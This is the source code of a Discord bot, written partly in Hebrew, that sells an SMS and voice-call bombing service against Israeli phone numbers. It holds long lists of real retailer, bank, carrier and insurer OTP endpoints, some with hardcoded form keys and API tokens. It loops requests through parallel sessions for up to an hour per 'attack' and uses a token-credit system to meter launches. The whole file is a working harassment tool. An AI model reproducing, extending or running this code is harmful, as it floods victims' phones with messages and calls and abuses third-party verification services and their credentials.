import discord
from discord.ext import commands
from discord import app_commands, ui
import asyncio
import aiohttp
import random
import os
import sys
from motor.motor_asyncio import AsyncIOMotorClient
from datetime import datetime, timedelta
import logging
import json

logging.basicConfig(level=logging.INFO)

MONGO_URI = os.getenv("MONGO_URI")
TOKEN = os.getenv("DISCORD_TOKEN")

if not MONGO_URI or not TOKEN:
    logging.error("❌ Missing environment variables!")
    sys.exit(1)

# התחברות ל-MongoDB
try:
    cluster = AsyncIOMotorClient(MONGO_URI)
    db = cluster["cyberbot"]
    users_col = db["users"]
    settings_col = db["settings"]  # קולקציה חדשה להגדרות
    logging.info("✅ Connected to MongoDB on Railway")
except Exception as e:
    logging.error(f"❌ Failed to connect to MongoDB: {e}")
    sys.exit(1)

class CyberBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix='!', intents=intents)
        self.start_time = datetime.now()
        self.active_attacks = {}
    
    async def setup_hook(self):
        await self.tree.sync()
        logging.info(f"🔱 OMNI-TOTAL-WAR BOT IS ONLINE")

bot = CyberBot()

# ========== ALL WORKING APIS ==========
WORKING_APIS = [
    # ===== MAGENTO APIS =====
    {"name": "Delta", "url": "https://www.delta.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Gali", "url": "https://www.gali.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Timberland", "url": "https://www.timberland.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Onot", "url": "https://www.onot.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Urbanica", "url": "https://www.urbanica-wh.com/customer/ajax/post/", "type": "magento"},
    {"name": "Castro", "url": "https://www.castro.com/customer/ajax/post/", "type": "magento"},
    {"name": "Hoodies", "url": "https://www.hoodies.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Crazy Line", "url": "https://www.crazyline.com/customer/ajax/post/", "type": "magento"},
    {"name": "Adika Style", "url": "https://www.adikastyle.com/customer/ajax/post/", "type": "magento"},
    {"name": "Weshoes", "url": "https://www.weshoes.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Nine West", "url": "https://www.ninewest.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Fix", "url": "https://www.fixunderwear.com/customer/ajax/post/", "type": "magento"},
    {"name": "Intima", "url": "https://www.intima-il.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Golf", "url": "https://www.golf-il.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Kiwi Kids", "url": "https://www.kiwi-kids.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Story", "url": "https://www.storyonline.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Nautica", "url": "https://www.nautica.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Lee Cooper", "url": "https://www.lee-cooper.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "KIKO Cosmetics", "url": "https://www.kikocosmetics.co.il/customer/ajax/post/", "type": "magento", "data": {"form_key": "cGVPpkwnKsxyj9vB", "bot_validation": "1", "type": "login", "telephone": "PHONE", "code": "", "compare_email": "", "compare_identity": "", "google-captcha-token": "FAKE_TOKEN"}},
    {"name": "TOP-TEN Fashion", "url": "https://www.topten-fashion.com/customer/ajax/post/", "type": "magento", "data": {"form_key": "H1eVw5PuOKdSD8D4", "bot_validation": "1", "type": "login", "telephone": "PHONE", "code": "", "compare_email": "", "compare_identity": ""}},
    {"name": "YVES ROCHER", "url": "https://www.yvesrocher.co.il/customer/ajax/post/", "type": "magento", "data": {"form_key": "Orc69ELb5UOWEeBa", "bot_validation": "1", "type": "login", "telephone": "PHONE", "code": "", "compare_email": "", "compare_identity": ""}},
    {"name": "Victoria's Secret", "url": "https://www.victoriassecret.co.il/customer/ajax/post/", "type": "magento", "data": {"form_key": "thaSi85aLykcocT4", "bot_validation": "1", "type": "login", "telephone": "PHONE", "code": "", "compare_email": "", "compare_identity": ""}},
    {"name": "Bath & Body Works", "url": "https://www.bathandbodyworks.co.il/customer/ajax/post/", "type": "magento", "data": {"form_key": "CqETdJMkaJsEneGf", "bot_validation": "1", "type": "login", "telephone": "PHONE", "code": "", "compare_email": "", "compare_identity": ""}},
    {"name": "Golf & Co", "url": "https://www.golfco.co.il/customer/ajax/post/", "type": "magento", "data": {"form_key": "XEWGYBBTMOFgpPkO", "bot_validation": "1", "type": "login", "telephone": "PHONE", "code": "", "compare_email": "", "compare_identity": ""}},
    
    # ===== SMS APIS =====
    {"name": "Shufersal", "url": "https://www.shufersal.co.il/api/v1/auth/otp", "type": "json", "data": {"phone": "PHONE_RAW"}},
    {"name": "Hopon", "url": "https://api.hopon.co.il/v0.15/1/isr/users", "type": "json", "data": {"clientKey": "11687CA9-2165-43F5-96FA-9277A03ABA9E", "countryCode": "972", "phone": "PHONE", "phoneCall": False}},
    {"name": "Laline", "url": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "type": "json", "data": {"phoneNumber": "PHONE", "uuid": "3214de05-19db-486e-8a94-f21da34d8bdd"}},
    {"name": "Go Mobile", "url": "https://api.gomobile.co.il/api/login", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "Tami4", "url": "https://www.tami4.co.il/api/login/start-sms-otp", "type": "json", "data": {"phoneNumber": "PHONE", "cookieToken": "1773745642871gciuvn5pcvhnext13", "isMobile": False, "recaptchaToken": "FAKE_TOKEN"}},
    {"name": "Trusty", "url": "https://trusty.co.il/api/auth/ask-for-auth-code", "type": "json", "data": {"email": "", "phone": "PHONE", "process_name": "normal_login", "provider_api_key": "q4IcUNl", "provider_api_token": "QLBLZTVcfnAf3DXqlFFvwJ2f2F3yTA33btswlNHN34Dv0bktWNdH5Q2OhKTH"}},
    {"name": "Super Pharm", "url": "https://www.super-pharm.co.il/api/sms", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "Ivory", "url": "https://www.ivory.co.il/user/login/sendCodeSms/temp@gmail.com/PHONE", "type": "get"},
    {"name": "Hamal", "url": "https://users-auth.hamal.co.il/auth/send-auth-code", "type": "json", "data": {"value": "PHONE", "type": "phone", "projectId": "1"}},
    {"name": "Mishloha", "url": "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber", "type": "json", "data": {"phoneNumber": "PHONE"}},
    
    # ===== APIs חדשים =====
    {"name": "FreeTV", "url": "https://middleware.freetv.tv/api/v1/send-verification-sms", "type": "json", "data": {"msisdn": "PHONE"}},
    {"name": "Spices Online", "url": "https://www.spicesonline.co.il/wp-admin/admin-ajax.php", "type": "form", "data": {"action": "validate_user_by_sms", "phone": "PHONE"}},
    {"name": "Go Mobile (2)", "url": "https://api.gomobile.co.il/api/login", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "Fox Home", "url": "https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send", "type": "json", "data": {"phoneNumber": "PHONE", "uuid": "da5161d0-3fa0-44b0-b06a-82d599cdb60a"}},
    {"name": "Blendo", "url": "https://blendo.co.il/wp-admin/admin-ajax.php", "type": "form", "data": {"action": "simply-check-member-cellphone", "cellphone": "PHONE", "captcha_response": ""}},
    {"name": "Jungle Club", "url": "https://www.jungle-club.co.il/wp-admin/admin-ajax.php", "type": "form", "data": {"action": "simply-check-member-cellphone", "cellphone": "PHONE", "captcha_response": ""}},
    {"name": "Magic ETL", "url": "https://story.magicetl.com/public/shopify/apps/otp-login/step-one", "type": "json", "data": {"phone": "PHONE"}},
    
    # ===== Care Glasses =====
    {"name": "Care Glasses", "url": "https://we.care.co.il/wp-admin/admin-ajax.php", "type": "form", "data": {
        "action": "elementor_pro_forms_send_form",
        "post_id": "351178",
        "form_id": "7079d8dd",
        "queried_id": "351178",
        "form_fields[name]": "CyberIL Spamer פרימיום",
        "form_fields[phone]": "PHONE",
        "form_fields[email]": "spamer@cyberil.com",
        "form_fields[accept]": "on",
        "form_fields[age]": "25",
        "form_fields[question_1]": "גם משקפי קריאה וגם ראייה",
        "form_fields[question_2]": "לא בטוח",
        "form_fields[kupa]": "כללית",
        "form_fields[kartis]": "כללית פלטינום",
        "form_fields[utm_source]": "website",
        "form_fields[refid]": "website"
    }},
]

# ========== APIs עם SMS + שיחות (VOICE) ==========
VOICE_APIS = [
    # ===== בנקים (שולחים גם SMS וגם שיחה) =====
    {"name": "Bank Hapoalim", "url": "https://login.bankhapoalim.co.il/api/otp/send", "type": "json", 
     "data": {"phone": "PHONE", "sendVoice": True}, "has_voice": True},
    {"name": "Bank Leumi", "url": "https://api.leumi.co.il/api/otp/send", "type": "json", 
     "data": {"phone": "PHONE", "voice": True}, "has_voice": True},
    {"name": "Discount Bank", "url": "https://api.discountbank.co.il/auth/otp", "type": "json", 
     "data": {"phone": "PHONE_RAW", "method": "voice"}, "has_voice": True},
    {"name": "Mizrahi Tefahot", "url": "https://api.mizrahi-tefahot.co.il/auth/otp", "type": "json", 
     "data": {"phone": "PHONE", "type": "voice"}, "has_voice": True},
    {"name": "Beinleumi", "url": "https://api.beinleumi.co.il/auth/send-otp", "type": "json", 
     "data": {"phone": "PHONE", "channel": "voice"}, "has_voice": True},
    {"name": "Union Bank", "url": "https://api.unionbank.co.il/auth/otp/voice", "type": "json", 
     "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Jerusalem Bank", "url": "https://api.bank-jerusalem.co.il/auth/otp", "type": "json", 
     "data": {"phone": "PHONE", "voice": True}, "has_voice": True},
    {"name": "Massad", "url": "https://api.massad.co.il/auth/otp/voice", "type": "json", 
     "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Yahav", "url": "https://api.yahav.co.il/auth/otp/voice", "type": "json", 
     "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Otsar Hahayal", "url": "https://api.otsar.org.il/auth/otp/voice", "type": "json", 
     "data": {"phone": "PHONE"}, "has_voice": True},
    
    # ===== חברות סלולר (יש שיחות אוטומטיות) =====
    {"name": "Cellcom Voice", "url": "https://www.cellcom.co.il/api/auth/voice", "type": "json", 
     "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Partner Voice", "url": "https://www.partner.co.il/api/auth/voice", "type": "json", 
     "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Pelephone Voice", "url": "https://www.pelephone.co.il/api/auth/voice", "type": "json", 
     "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Hot Voice", "url": "https://www.hotmobile.co.il/api/auth/voice", "type": "json", 
     "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "019 Voice", "url": "https://019sms.co.il/api/auth/voice", "type": "json", 
     "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "012 Mobile", "url": "https://www.012.net.il/api/auth/voice", "type": "json", 
     "data": {"phone": "PHONE"}, "has_voice": True},
    
    # ===== אתרי קניות עם שיחות =====
    {"name": "Shufersal Voice", "url": "https://www.shufersal.co.il/api/v1/auth/voice", "type": "json", 
     "data": {"phone": "PHONE_RAW"}, "has_voice": True},
    {"name": "Rami Levi Voice", "url": "https://www.rami-levy.co.il/api/auth/voice", "type": "json", 
     "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Victory Voice", "url": "https://www.victory.co.il/api/auth/voice", "type": "json", 
     "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "SuperPharm Voice", "url": "https://www.super-pharm.co.il/api/voice", "type": "json", 
     "data": {"phone": "PHONE"}, "has_voice": True},
    
    # ===== אפליקציות תחבורה עם שיחות =====
    {"name": "Pango Voice", "url": "https://api.pango.co.il/auth/voice", "type": "json", 
     "data": {"phoneNumber": "PHONE_RAW"}, "has_voice": True},
    {"name": "Gett Voice", "url": "https://www.gett.com/il/api/voice", "type": "json", 
     "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Hopon Voice", "url": "https://api.hopon.co.il/v0.15/1/isr/users/voice", "type": "json", 
     "data": {"phone": "PHONE"}, "has_voice": True},
    
    # ===== ביטוח =====
    {"name": "Clal Insurance", "url": "https://api.clalbit.co.il/auth/otp/voice", "type": "json", 
     "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Harel Insurance", "url": "https://api.harel-group.co.il/auth/voice", "type": "json", 
     "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Menora Mivtachim", "url": "https://api.menora.co.il/auth/otp/voice", "type": "json", 
     "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Phoenix Insurance", "url": "https://api.phoenix.co.il/auth/voice", "type": "json", 
     "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Migdal Insurance", "url": "https://api.migdal.co.il/auth/otp/voice", "type": "json", 
     "data": {"phone": "PHONE"}, "has_voice": True},
]

# ========== מג'נטו ישראל (SMS בלבד) ==========
MAGENTO_APIS = [api for api in WORKING_APIS if api["type"] == "magento"]

# ========== SMS APIs (כל השאר) ==========
SMS_APIS = [api for api in WORKING_APIS if api["type"] != "magento"]

# שילוב כל ה-APIs
ALL_APIS = WORKING_APIS + VOICE_APIS

# ========== פונקציות שליחה ==========
async def send_magento(session, url, phone_raw):
    """שליחת SMS דרך מג'נטו"""
    data = {
        "type": "login",
        "telephone": phone_raw,
        "bot_validation": 1
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest"
    }
    
    try:
        async with session.post(url, data=data, headers=headers, timeout=5) as resp:
            return resp.status in [200, 201, 202]
    except:
        return False

async def send_api(session, api, phone, phone_raw):
    """שליחת SMS/שיחה דרך API"""
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
        }
        
        if api["type"] == "get":
            url = api["url"].replace("PHONE", phone)
            async with session.get(url, headers=headers, timeout=5) as resp:
                return resp.status in [200, 201, 202, 204]
        
        elif api["type"] == "form":
            url = api["url"]
            data = api["data"].replace("PHONE", phone) if isinstance(api["data"], str) else api["data"]
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            if isinstance(data, str):
                async with session.post(url, data=data, headers=headers, timeout=5) as resp:
                    return resp.status in [200, 201, 202, 204]
            else:
                async with session.post(url, data=data, headers=headers, timeout=5) as resp:
                    return resp.status in [200, 201, 202, 204]
        
        else:  # json
            url = api["url"]
            headers["Content-Type"] = "application/json"
            if isinstance(api["data"], dict):
                data_str = json.dumps(api["data"])
                data_str = data_str.replace("PHONE", phone)
                data_str = data_str.replace("PHONE_RAW", phone_raw)
                data = json.loads(data_str)
            else:
                data = api["data"]
            async with session.post(url, json=data, headers=headers, timeout=5) as resp:
                return resp.status in [200, 201, 202, 204]
    except:
        return False

# ========== פונקציית בדיקה משופרת ==========
async def check_apis_function(interaction: discord.Interaction):
    """בדיקה מקיפה של כל ה-APIs עם פירוט"""
    
    await interaction.response.send_message("🔍 **מתחיל בדיקה מקיפה...** זה ייקח כ-2 דקות", ephemeral=True)
    
    test_phone = "972501234567"
    test_raw = "0501234567"
    
    results = {
        "magento": {"working": [], "failed": []},
        "sms": {"working": [], "failed": []},
        "voice": {"working": [], "failed": []}
    }
    
    # בדיקת מג'נטו
    await interaction.followup.send("🔄 בודק מג'נטו...", ephemeral=True)
    async with aiohttp.ClientSession() as session:
        for api in MAGENTO_APIS:
            success = await send_magento(session, api["url"], test_raw)
            if success:
                results["magento"]["working"].append(api["name"])
            else:
                results["magento"]["failed"].append(api["name"])
            await asyncio.sleep(0.2)
    
    # בדיקת SMS APIs
    await interaction.followup.send("🔄 בודק SMS APIs...", ephemeral=True)
    async with aiohttp.ClientSession() as session:
        for api in SMS_APIS:
            success = await send_api(session, api, test_phone, test_raw)
            if success:
                results["sms"]["working"].append(api["name"])
            else:
                results["sms"]["failed"].append(api["name"])
            await asyncio.sleep(0.2)
    
    # בדיקת Voice APIs
    await interaction.followup.send("🔄 בודק Voice APIs (שיחות)...", ephemeral=True)
    async with aiohttp.ClientSession() as session:
        for api in VOICE_APIS:
            success = await send_api(session, api, test_phone, test_raw)
            if success:
                results["voice"]["working"].append(api["name"])
            else:
                results["voice"]["failed"].append(api["name"])
            await asyncio.sleep(0.2)
    
    # דוח מפורט
    report = "**📊 תוצאות בדיקה מקיפה**\n\n"
    
    # סיכום כללי
    total_working = len(results["magento"]["working"]) + len(results["sms"]["working"]) + len(results["voice"]["working"])
    total_apis = len(MAGENTO_APIS) + len(SMS_APIS) + len(VOICE_APIS)
    report += f"**סה\"כ: {total_working}/{total_apis} עובדים**\n\n"
    
    # מג'נטו
    report += f"**🎯 מג'נטו ({len(results['magento']['working'])}/{len(MAGENTO_APIS)}):**\n"
    for name in results["magento"]["working"][:10]:
        report += f"✅ {name}\n"
    if len(results["magento"]["working"]) > 10:
        report += f"... ועוד {len(results['magento']['working'])-10}\n"
    
    # SMS
    report += f"\n**📱 SMS APIs ({len(results['sms']['working'])}/{len(SMS_APIS)}):**\n"
    for name in results["sms"]["working"][:10]:
        report += f"✅ {name}\n"
    if len(results["sms"]["working"]) > 10:
        report += f"... ועוד {len(results['sms']['working'])-10}\n"
    
    # Voice
    report += f"\n**📞 Voice APIs (שיחות) ({len(results['voice']['working'])}/{len(VOICE_APIS)}):**\n"
    for name in results["voice"]["working"][:10]:
        report += f"✅ {name}\n"
    if len(results["voice"]["working"]) > 10:
        report += f"... ועוד {len(results['voice']['working'])-10}\n"
    
    # רשימת כל העובדים
    report += f"\n**✅ כל העובדים ({total_working}):**\n"
    all_working = (results["magento"]["working"] + results["sms"]["working"] + results["voice"]["working"])
    for name in sorted(all_working)[:20]:
        report += f"• {name}\n"
    if len(all_working) > 20:
        report += f"... ועוד {len(all_working)-20}"
    
    await interaction.followup.send(report[:1900], ephemeral=True)
    
    logging.info(f"Check results - Magento: {len(results['magento']['working'])}/{len(MAGENTO_APIS)}, SMS: {len(results['sms']['working'])}/{len(SMS_APIS)}, Voice: {len(results['voice']['working'])}/{len(VOICE_APIS)}")

# ========== פקודת setup-credits חדשה ==========
@bot.tree.command(name="setup-credits", description="⚙️ הגדר את כמות הטוקנים למשתמש")
@app_commands.default_permissions(administrator=True)
async def setup_credits(interaction: discord.Interaction, user: discord.User, amount: int):
    """פקודת אדמין להגדרת טוקנים למשתמש"""
    
    if amount < 0:
        await interaction.response.send_message("❌ כמות חייבת להיות חיובית", ephemeral=True)
        return
    
    user_id = str(user.id)
    await users_col.update_one(
        {"user_id": user_id},
        {"$set": {"tokens": amount}},
        upsert=True
    )
    
    # עיצוב יפה
    embed = discord.Embed(
        title="💎 **CREDITS UPDATED**",
        color=0xFFD700,
        timestamp=datetime.now()
    )
    embed.set_author(name=interaction.guild.name if interaction.guild else "Server", icon_url=interaction.guild.icon.url if interaction.guild else None)
    embed.add_field(name="👤 **User**", value=f"{user.mention}", inline=True)
    embed.add_field(name="💳 **New Balance**", value=f"**{amount}**", inline=True)
    embed.set_footer(text="Just Spam System")
    
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="setup-credits-panel", description="📊 פתח פאנל ניהול טוקנים")
@app_commands.default_permissions(administrator=True)
async def setup_credits_panel(interaction: discord.Interaction):
    """פתיחת פאנל לניהול טוקנים"""
    
    embed = discord.Embed(
        title="⚙️ **TOKEN MANAGEMENT PANEL**",
        description="ניהול טוקנים למשתמשים",
        color=0x5865F2
    )
    
    view = CreditsView()
    await interaction.response.send_message(embed=embed, view=view)

class CreditsView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=60)
    
    @discord.ui.button(label="➕ הוסף טוקנים", style=discord.ButtonStyle.success, emoji="➕")
    async def add_credits(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(AddCreditsModal())
    
    @discord.ui.button(label="🔍 בדוק טוקנים", style=discord.ButtonStyle.secondary, emoji="🔍")
    async def check_credits(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(CheckCreditsModal())
    
    @discord.ui.button(label="📊 טופ 10", style=discord.ButtonStyle.primary, emoji="📊")
    async def top_credits(self, interaction: discord.Interaction, button: discord.ui.Button):
        await show_top_credits(interaction)

class AddCreditsModal(ui.Modal, title="➕ הוסף טוקנים"):
    user_id = ui.TextInput(label="🆔 מזהה משתמש", placeholder="הכנס ID של המשתמש", required=True)
    amount = ui.TextInput(label="💎 כמות טוקנים", placeholder="לדוגמה: 100", required=True)
    
    async def on_submit(self, interaction: discord.Interaction):
        try:
            user_id = self.user_id.value.strip()
            amount = int(self.amount.value)
            
            if amount < 1:
                await interaction.response.send_message("❌ כמות חייבת להיות גדולה מ-0", ephemeral=True)
                return
            
            # עדכון במסד
            result = await users_col.update_one(
                {"user_id": user_id},
                {"$inc": {"tokens": amount}},
                upsert=True
            )
            
            user_doc = await users_col.find_one({"user_id": user_id})
            new_balance = user_doc.get("tokens", amount) if user_doc else amount
            
            embed = discord.Embed(
                title="✅ **TOKENS ADDED**",
                color=0x00FF00,
                timestamp=datetime.now()
            )
            embed.add_field(name="🆔 User ID", value=f"`{user_id}`", inline=False)
            embed.add_field(name="➕ Added", value=f"**+{amount}**", inline=True)
            embed.add_field(name="💳 New Balance", value=f"**{new_balance}**", inline=True)
            
            await interaction.response.send_message(embed=embed, ephemeral=True)
            
        except ValueError:
            await interaction.response.send_message("❌ כמות לא תקינה", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"❌ שגיאה: {e}", ephemeral=True)

class CheckCreditsModal(ui.Modal, title="🔍 בדוק טוקנים"):
    user_id = ui.TextInput(label="🆔 מזהה משתמש", placeholder="הכנס ID של המשתמש", required=True)
    
    async def on_submit(self, interaction: discord.Interaction):
        user_id = self.user_id.value.strip()
        user_doc = await users_col.find_one({"user_id": user_id})
        tokens = user_doc.get("tokens", 0) if user_doc else 0
        
        embed = discord.Embed(
            title="💎 **TOKEN BALANCE**",
            color=0x5865F2,
            timestamp=datetime.now()
        )
        embed.add_field(name="🆔 User ID", value=f"`{user_id}`", inline=False)
        embed.add_field(name="💳 Balance", value=f"**{tokens}**", inline=True)
        
        await interaction.response.send_message(embed=embed, ephemeral=True)

async def show_top_credits(interaction: discord.Interaction):
    """הצגת טופ 10 המשתמשים עם הכי הרבה טוקנים"""
    
    cursor = users_col.find().sort("tokens", -1).limit(10)
    top_users = await cursor.to_list(length=10)
    
    embed = discord.Embed(
        title="🏆 **TOP 10 RICHEST USERS**",
        color=0xFFD700,
        timestamp=datetime.now()
    )
    
    if not top_users:
        embed.description = "אין משתמשים עדיין"
    else:
        ranking = ""
        for i, user in enumerate(top_users, 1):
            medal = "🥇" if i == 1 else "🥈" if i == 2 else "🥉" if i == 3 else f"{i}."
            ranking += f"{medal} `{user['user_id'][:8]}...` • **{user['tokens']}** 💎\n"
        embed.description = ranking
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

# ========== פקודות ==========
@bot.tree.command(name="check", description="בדוק אילו APIs עובדים")
async def check_command(interaction: discord.Interaction):
    await check_apis_function(interaction)

@bot.tree.command(name="stop", description="עצור את כל המתקפות")
async def stop_command(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    stopped = 0
    for attack_id in list(bot.active_attacks.keys()):
        if attack_id.startswith(user_id):
            bot.active_attacks[attack_id] = False
            stopped += 1
    await interaction.response.send_message(f"🛑 עצרתי {stopped} מתקפות", ephemeral=True)

# ========== מתקפה ==========
async def run_attack(phone, duration_mins, attack_type, user_id, interaction, attack_id):
    """הרצת מתקפה לפי סוג"""
    phone_raw = phone[3:] if phone.startswith("972") else phone[1:]
    
    end_time = datetime.now() + timedelta(minutes=duration_mins)
    total_sent = 0
    running = True
    
    # בחירת APIs לפי סוג
    if attack_type == "magento":
        apis = MAGENTO_APIS
        api_type = "מג'נטו"
    elif attack_type == "sms":
        apis = SMS_APIS
        api_type = "SMS"
    elif attack_type == "voice":
        apis = VOICE_APIS
        api_type = "שיחות"
    else:  # הכל
        apis = ALL_APIS
        api_type = "הכל"
    
    await interaction.followup.send(
        f"⚡ **מתקפה הופעלה!**\n"
        f"📱 טלפון: {phone}\n"
        f"⏱️ משך: {duration_mins} דקות\n"
        f"🎯 סוג: {api_type}\n"
        f"📡 APIs: {len(apis)}",
        ephemeral=True
    )
    
    logging.info(f"⚡ {api_type} attack started - {attack_id}")
    
    # 3 סשנים במקביל
    sessions = [aiohttp.ClientSession() for _ in range(3)]
    
    try:
        while running and datetime.now() < end_time:
            if attack_id in bot.active_attacks and not bot.active_attacks[attack_id]:
                running = False
                break
            
            tasks = []
            for session in sessions:
                for api in apis:
                    if api.get("type") == "magento":
                        tasks.append(send_magento(session, api["url"], phone_raw))
                    else:
                        tasks.append(send_api(session, api, phone, phone_raw))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            round_sent = sum(1 for r in results if r is True)
            total_sent += round_sent
            
            # עדכון כל 30 שניות
            if int((datetime.now() - (end_time - timedelta(minutes=duration_mins))).total_seconds()) % 30 == 0:
                await interaction.followup.send(f"📊 התקדמות: {total_sent} הודעות/שיחות", ephemeral=True)
            
            await asyncio.sleep(0.3)
    
    finally:
        for session in sessions:
            await session.close()
    
    if attack_id in bot.active_attacks:
        del bot.active_attacks[attack_id]
    
    await interaction.followup.send(f"✅ **הסתיים!** סה\"כ {total_sent}", ephemeral=True)
    logging.info(f"✅ Attack ended - Total: {total_sent}")

# ========== ממשק משתמש ==========
class AttackModal(ui.Modal, title="💣 OMNI TOTAL WAR - VOICE EDITION"):
    phone = ui.TextInput(
        label="📱 מספר טלפון", 
        placeholder="972501234567",
        default="972501234567"
    )
    duration = ui.TextInput(
        label="⏱️ משך בדקות", 
        default="5", 
        placeholder="1-60"
    )
    attack_type = ui.TextInput(
        label="🎯 סוג מתקפה", 
        default="all", 
        placeholder="magento / sms / voice / all"
    )

    async def on_submit(self, interaction: discord.Interaction):
        phone = self.phone.value.strip()
        attack_type = self.attack_type.value.strip().lower()
        
        if not phone.startswith("972"):
            await interaction.response.send_message("❌ מספר חייב להתחיל ב-972", ephemeral=True)
            return
        
        if attack_type not in ["magento", "sms", "voice", "all"]:
            await interaction.response.send_message("❌ סוג לא תקין. בחר: magento/sms/voice/all", ephemeral=True)
            return
        
        try:
            duration = int(self.duration.value)
            if duration < 1 or duration > 60:
                await interaction.response.send_message("❌ משך חייב להיות 1-60 דקות", ephemeral=True)
                return
        except:
            await interaction.response.send_message("❌ משך לא תקין", ephemeral=True)
            return
        
        user_id = str(interaction.user.id)
        user_doc = await users_col.find_one({"user_id": user_id})
        
        if not user_doc:
            await users_col.insert_one({"user_id": user_id, "tokens": 100})
            user_doc = {"tokens": 100}
        
        if user_doc.get("tokens", 0) < 1:
            await interaction.response.send_message("❌ אין לך טוקנים!", ephemeral=True)
            return
        
        await users_col.update_one({"user_id": user_id}, {"$inc": {"tokens": -1}})
        
        attack_id = f"{user_id}_{datetime.now().timestamp()}"
        bot.active_attacks[attack_id] = True
        
        embed = discord.Embed(
            title="🚀 **ATTACK LAUNCHED**",
            color=0xFF0000,
            timestamp=datetime.now()
        )
        embed.add_field(name="📱 Phone", value=f"`{phone}`", inline=True)
        embed.add_field(name="⏱️ Duration", value=f"`{duration} minutes`", inline=True)
        embed.add_field(name="🎯 Type", value=f"`{attack_type}`", inline=True)
        embed.add_field(name="💎 Tokens Left", value=f"`{user_doc['tokens']-1}`", inline=True)
        embed.set_footer(text="Just Spam System")
        
        await interaction.response.send_message(embed=embed, ephemeral=True)
        
        asyncio.create_task(run_attack(phone, duration, attack_type, user_id, interaction, attack_id))

class MainView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=180)
    
    @discord.ui.button(label="💣 הפעל מתקפה", style=discord.ButtonStyle.danger, emoji="💣")
    async def attack_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(AttackModal())
    
    @discord.ui.button(label="🔍 בדוק APIs", style=discord.ButtonStyle.secondary, emoji="🔍")
    async def check_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await check_apis_function(interaction)
    
    @discord.ui.button(label="🛑 עצור הכל", style=discord.ButtonStyle.secondary, emoji="🛑")
    async def stop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        user_id = str(interaction.user.id)
        stopped = 0
        for attack_id in list(bot.active_attacks.keys()):
            if attack_id.startswith(user_id):
                bot.active_attacks[attack_id] = False
                stopped += 1
        await interaction.response.send_message(f"🛑 עצרתי {stopped} מתקפות", ephemeral=True)
    
    @discord.ui.button(label="💎 Free Coins", style=discord.ButtonStyle.success, emoji="💎", row=1)
    async def free_coins(self, interaction: discord.Interaction, button: discord.ui.Button):
        user_id = str(interaction.user.id)
        user_doc = await users_col.find_one({"user_id": user_id})
        
        # בדיקה אם כבר קיבל היום
        last_claim = user_doc.get("last_claim") if user_doc else None
        if last_claim:
            last_claim_time = last_claim if isinstance(last_claim, datetime) else datetime.fromisoformat(last_claim)
            if datetime.now() - last_claim_time < timedelta(hours=24):
                remaining = timedelta(hours=24) - (datetime.now() - last_claim_time)
                hours = remaining.seconds // 3600
                minutes = (remaining.seconds % 3600) // 60
                await interaction.response.send_message(f"⏳ תוכל לקבל שוב בעוד {hours} שעות ו-{minutes} דקות", ephemeral=True)
                return
        
        # הוספת טוקן
        await users_col.update_one(
            {"user_id": user_id},
            {"$inc": {"tokens": 1}, "$set": {"last_claim": datetime.now()}},
            upsert=True
        )
        
        embed = discord.Embed(
            title="🎉 **FREE COIN CLAIMED!**",
            description="קיבלת 1 טוקן במתנה!",
            color=0xFFD700,
            timestamp=datetime.now()
        )
        embed.set_footer(text="Just Spam System")
        
        await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="setup", description="📊 פתח פאנל שליטה ראשי")
async def setup(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    user_doc = await users_col.find_one({"user_id": user_id})
